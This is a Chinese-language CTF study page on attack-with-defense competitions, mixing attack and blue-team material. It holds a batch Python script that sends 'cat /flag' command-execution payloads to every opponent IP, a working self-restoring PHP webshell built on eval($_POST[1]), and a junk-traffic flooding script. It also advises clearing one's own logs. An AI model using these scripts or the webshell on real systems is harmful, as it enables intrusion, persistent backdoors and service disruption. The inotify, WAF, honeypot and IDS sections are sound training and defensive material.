---
title: AWD 攻防兼备赛制实战策略与蓝队 ATT&CK 防御体系
description: 系统梳理 AWD（攻防兼备）赛制规则、比赛流程、加固与利用并行策略、批量 Flag 提交脚本、不死马原理与克制、搅屎棍干扰战术、inotify
  文件监控防御及微型 WAF 部署实战，并引入 ATT&CK 框架、蜜罐技术、IDS 部署等蓝队防御视角。
category: program-analysis
tags:
- AWD
- CTF
- Attack With Defense
- 红蓝对抗
- 不死马
- inotify
- WAF
- ATT&CK
- 蜜罐
- IDS
- XD安全
- 渗透测试
date: 2024-01-15
updated: '2026-11-14'
---
## AWD 赛制核心规则

### 基本模式
AWD（Attack With Defense，攻防兼备）要求参赛队伍在同一场比赛中同时扮演攻击方与防守方。攻击他人靶机获取 Flag 可得分，自身服务被攻破或存活检测失败则扣分。

### 评分机制
- **Flag 轮次刷新**：通常 5–10 分钟一轮，Flag 存放在各服务、数据库、主机中
- **提交接口**：需将获取的 Flag 提交至裁判机指定 API 计分
- **扣分维度**：
  1. Pick 失败（存活检测不通过）
  2. 被攻击（Flag 被拿走）
  3. Pick 失败且被攻击（叠加扣分，部分赛制二者分值相同）

> 💡 策略提示：若 Pick 失败与被攻击扣分相当，可考虑主动删库/停服规避更大损失，但需确认赛制规则是否允许。

### 典型题目特征
- Web 方向多为知名 CMS（需平时积累常见 CMS 漏洞利用）
- 漏洞类型以 **文件上传、文件包含、命令执行、反序列化** 等基础类为主
- 单台服务器通常存在多个漏洞点，难度适中，核心在于**全面挖掘 + 快速批量化利用**

---

## 比赛全流程操作规范

### 阶段 1：连接与分工（赛前准备）
- 主办方提供普通权限 SSH 账号，**权限受限，关键目录不可写**
- 团队 3–4 人建议分工：
  - **代码审计/漏洞挖掘**（1–2 人）
  - **加固/修补**（1 人）
  - **攻击脚本编写与批量运维**（1 人）

### 阶段 2：资产备份与代码审计
- **首要动作**：全站源码打包下载本地
  ```bash
  tar -zcvf web_backup.tar.gz /var/www/html
  ```
- 推荐工具辅助扫描：`Seay`、`D盾`、PHP 语法检查、敏感函数 grep
- 重点关注目录：
  - `/var/www/html`、应用框架核心目录、上传目录、配置文件

### 阶段 3：加固与利用并行
| 动作 | 关键点 |
|------|--------|
| **漏洞修补** | 优先修复高危 RCE、文件上传、反序列化；保留必要功能通过 Pick |
| **批量攻击** | 编写自动化脚本循环攻击所有靶机 IP，解析 Flag 并提交 |
| **流量溯源** | 监控 `/var/log/apache2/`、`/usr/local/apache2/logs/`、`/usr/nginx/logs/` 反推对手 Payload |
| **日志清理** | 定期清理自身访问日志，防止被溯源 |

### 阶段 4：常用运维命令速查
```bash
# 进程/端口/连接
netstat -antlp | grep :80
ss -antlp
lsof -i:80

# 文件监控与权限
ls -la /var/www/html/
chattr +i /var/www/html/shell.php   # 锁定关键文件防篡改
chattr -i /var/www/html/shell.php   # 解锁

# 计划任务排查
crontab -l
cat /etc/crontab
ls /etc/cron.*

# 账号审计
cat /etc/passwd
last
who
```

---

## 批量 Flag 提交脚本工程化

### 核心流程
1. **目标 IP 列表** 生成（排除自队 IP）
2. **漏洞利用模块**：针对特定漏洞构造 Payload（命令执行、文件读取、反序列化等）
3. **Flag 提取**：正则匹配 `flag{...}` 或指定格式
4. **提交接口调用**：HTTP POST 到裁判机 API，处理 Token/签名
5. **异常重试与限速**：避免触发防刷机制

### 典型代码骨架
```python
#!/usr/bin/env python3
import requests, re, threading, time, sys

TARGETS = [f"10.10.10.{i}" for i in range(1, 255) if i != MY_TEAM_IP]
FLAG_REGEX = re.compile(r'flag\{[^}]+\}')
SUBMIT_URL = "http://judge.example.com/api/submit"
TEAM_TOKEN = "YOUR_TEAM_TOKEN"

def exploit(ip):
    try:
        # 示例：命令执行读取 Flag
        r = requests.post(f"http://{ip}/vuln.php", data={"cmd": "cat /flag"}, timeout=3)
        flags = FLAG_REGEX.findall(r.text)
        for flag in flags:
            submit(flag)
    except Exception as e:
        pass

def submit(flag):
    requests.post(SUBMIT_URL, json={"flag": flag, "token": TEAM_TOKEN}, timeout=2)

threads = []
for ip in TARGETS:
    t = threading.Thread(target=exploit, args=(ip,))
    t.start()
    threads.append(t)
    time.sleep(0.1)  # 限速

for t in threads:
    t.join()
```

> 🔗 实战中常结合 [[xd-security-python-security-development-notes]] 中的 `requests`/`lxml` 批量化模板与 [[sqlmap-api-automation]] 的任务调度思路复用。

---

## 不死马（Undying Webshell）原理与克制

### 原理机制
利用 **文件自复制 + 死循环 + 短时 sleep** 实现“删除即复活”：
```php
<?php
ignore_user_abort(true);
set_time_limit(0);
$file = __FILE__;
$code = '<?php eval($_POST[1]);?>';  // 核心后门代码
while (true) {
    if (!file_exists($file) || md5_file($file) !== md5($code)) {
        file_put_contents($file, $code);
    }
    usleep(50000);  // 50ms 轮询，平衡 CPU 与复活速度
}
?>
```
- **触发条件**：需访问一次该脚本启动守护进程（驻留内存）
- **隐蔽性**：进程名为 `php`，常驻内存，文件系统层面看似正常

### 克制方案
| 方案 | 实现要点 |
|------|----------|
| **条件竞争覆写** | 写入同名文件，sleep 时间**更短**（如 10ms），抢占写入窗口，植入无害内容或自毁逻辑 |
| **进程级清除** | `ps aux | grep php` 定位可疑进程 → `kill -9 <PID>` → 删除文件 |
| **inotify 监控拦截** | 见下节，实时捕获文件创建/修改事件并自动隔离 |
| **文件属性锁定** | `chattr +i` 禁止写入/删除（需 root，且会阻断正常部署） |

> ⚠️ 部分赛制明令禁止不死马，使用前必读规则。

---

## 搅屎棍干扰战术

### 核心思路
向对手靶机发送大量**无效/混淆 Payload**，污染流量日志、干扰自动化攻击脚本解析、消耗对手分析精力。

### 实施示例
```python
# 向目标持续发送随机垃圾请求
import requests, random, string, threading, time

def noise(ip):
    while True:
        junk = ''.join(random.choices(string.ascii_letters + string.digits, k=200))
        try:
            requests.post(f"http://{ip}/", data={"junk": junk}, timeout=1)
        except: pass
        time.sleep(0.05)

for ip in ENEMY_IPS:
    threading.Thread(target=noise, args=(ip,), daemon=True).start()
```

### 变体战术
- **回手掏**：利用对手留下的 Webshell/后门反向拿其 Flag
- **日志投毒**：构造特殊 User-Agent、Referer 触发对手 WAF/日志分析报警疲劳

> ⚠️ 亦需确认赛制是否允许干扰流量，部分比赛视为恶意攻击判负。

---

## inotify 文件监控防御体系

### 原理
Linux 内核 `inotify` 机制可实时监听文件系统事件（创建、修改、删除、移动、属性变更），配合用户态守护进程实现**毫秒级检测与自动响应**。

### 部署架构
```
inotifywait (内核事件) → 守护进程解析事件 → 判定规则匹配 → 动作执行（隔离/告警/自动修复）
```

### 关键监控目录
- Web 根目录：`/var/www/html/`
- 上传目录：`/var/www/html/uploads/`
- 临时目录：`/tmp/`, `/var/tmp/`
- 配置目录：`/etc/apache2/`, `/etc/nginx/`, `/usr/local/php/etc/`

### 典型规则集
| 事件掩码 | 含义 | 响应动作 |
|----------|------|----------|
| `CREATE,MOVED_TO` | 新文件/移入文件 | 实时扫描（clamav/yara/正则）→ 恶意则 `mv` 隔离区并 `chmod 000` |
| `MODIFY` | 文件内容修改 | 对比白名单哈希，不匹配则告警+备份原文件 |
| `DELETE` | 关键文件被删 | 从 Git/备份自动恢复，记录审计日志 |
| `ATTRIB` | 权限/属性变更 | 监控 `chattr`、`chmod 777` 等提权前兆 |

### 一键部署脚本片段
```bash
#!/bin/bash
WATCH_DIRS=("/var/www/html" "/tmp" "/var/tmp")
QUARANTINE="/var/quarantine/$(date +%F_%H-%M-%S)"
mkdir -p "$QUARANTINE"

inotifywait -m -r -e create,modify,move,delete,attrib --format '%w%f %e' "${WATCH_DIRS[@]}" |
while read FILE EVENT; do
    # 简单示例：发现 .php/.phtml/.jsp 后缀新增直接隔离
    if [[ "$EVENT" =~ CREATE|MOVED_TO ]] && [[ "$FILE" =~ \.(php|phtml|jsp|asp|aspx)$ ]]; then
        mv "$FILE" "$QUARANTINE/"
        echo "[ALERT] $(date) Suspicious file $FILE quarantined" >> /var/log/inotify_defense.log
    fi
done
```

### 进阶：注入微型 WAF
在监控脚本中对新增/修改的 PHP 文件**自动注入防御头**：
```php
// 自动在文件首行插入
require_once('/opt/micro_waf/waf.php');
```
`waf.php` 实现：
- 请求参数规则过滤（SQLi、XSS、命令注入、路径穿越）
- 危险函数调用拦截（`eval`、`assert`、`system`、`passthru` 等）
- 虚拟补丁：针对已知漏洞点的针对性规则

> 🔗 微型 WAF 规则编写可参考 [[xd-security-waf-bypass-techniques-day46-49]] 中的绕过视角反向构建规则，并结合 [[php-webshell-obfuscation-av-evasion]] 识别混淆后门特征。

---

## 蓝队视角：ATT&CK 框架与主动防御

### MITRE ATT&CK 落地要点
1. **技战术映射**：将 AWD 攻击行为（初始访问、持久化、权限提升、凭证获取、横向移动、数据窃取）对标 ATT&CK 矩阵
2. **检测规则编写**：基于 TTP 编写 Sigma/Elastic/KQL 规则，覆盖 WebShell 写入、计划任务植入、SSH 暴破、容器逃逸等
3. **红蓝复盘**：赛后按 ATT&CK 矩阵复盘攻防得失，建立队伍专属知识库

### 蜜罐技术主动诱捕
- **部署平台**：[HFish](https://hfish.io/) 开源蜜罐平台，支持 Web、SSH、Redis、MySQL、FTP、Elasticsearch 等高交互/低交互模式
- **AWD 场景应用**：
  - 在非核心端口部署高交互 Web 蜜罐，捕获对手扫描器指纹、自动化工具特征
  - 记录攻击 Payload 反向生成 IOC，同步至 WAF/IDS 规则库
  - 伪造 Flag 文件诱导对手提交无效 Flag（若赛制允许）

### IDS/IPS 深度部署
| 维度 | 方案 | 关键能力 |
|------|------|----------|
| **NIDS** | Suricata / Zeek (Bro) | 全流量镜像解析，HTTP/DNS/SMB 协议深度解码，支持 Lua/规则扩展 |
| **HIDS** | OSSEC / Wazuh / Auditd | 文件完整性监控（FIM）、进程审计、登录审计、Rootkit 扫描 |
| **威胁情报** | 集成 MISP / OpenCTI | 自动拉取恶意 IP/域名/Hash，实时封禁与告警 |
| **响应自动化** | SOAR (Shuffle / Cortex XSOAR) | 编排隔离主机、封禁 IP、滚动凭证、恢复快照 |

> 🔗 详细部署细节可参考 [[named-pipe-smb-detection-sysmon]] 中的 Sysmon 事件映射思路，以及 [[internal-network-pivoting-techniques]] 的代理流量识别方法。

---

## 交叉引用导航

| 领域 | 相关知识页 |
|------|------------|
| **Web 漏洞利用与加固** | [[xd-security-pentest-basic-stage-notes]]、[[php-file-inclusion-vulnerability]]、[[php-webshell-fundamentals-chopper-analysis]]、[[xd-security-waf-bypass-techniques-day46-49]] |
| **批量化工具开发** | [[xd-security-python-security-development-notes]]、[[sqlmap-api-automation]] |
| **应急响应与溯源** | [[xd-security-incident-response-notes]]、[[named-pipe-smb-detection-sysmon]] |
| **内网横向与隧道** | [[internal-network-pivoting-techniques]]、[[frp内网渗透应用]] |
| **二进制/PWN 视角** | [[buuctf-pwn-writeup-collection]]、[[rop-linux-x86-beginner-tutorial]] |
| **CTF 实战靶场** | [[attack-defense-world-beginner-web-writeup]]、[[pikachu-target-writeup-part1-setup-brute-force]] |

---

## 速查清单（赛前打印版）

- [ ] 团队分工表（审计/加固/攻击/运维）
- [ ] 常用 CMS 漏洞利用库（ThinkPHP、Laravel、DedeCMS、Discuz、WordPress 等）
- [ ] 批量攻击脚本模板（含 Flag 提交、异常重试、限速）
- [ ] 加固清单：危险函数禁用、上传目录解析禁用、open_basedir、文件权限最小化
- [ ] inotify 监控脚本 + 微型 WAF 规则包（已测试不拦截正常业务）
- [ ] 蜜罐部署脚本（HFish Docker Compose 一键起）
- [ ] 日志收集转发配置（Rsyslog → ELK/ClickHouse）
- [ ] 赛制规则确认单（是否允许不死马、搅屎棍、主动删库、工具使用）
- [ ] 赛后复盘模板（ATT&CK 映射、得失分归因、规则优化）

---

> 本页基于 XD安全 Day80-82 学习笔记整理，融合实战经验与蓝队防御体系，旨在为 AWD 赛制参赛者提供**从规则理解到工程落地**的完整知识地图。

## 来源

- [0x00实验室-202108-202304_095](../sources/0x00实验室-202108-202304_095.md)
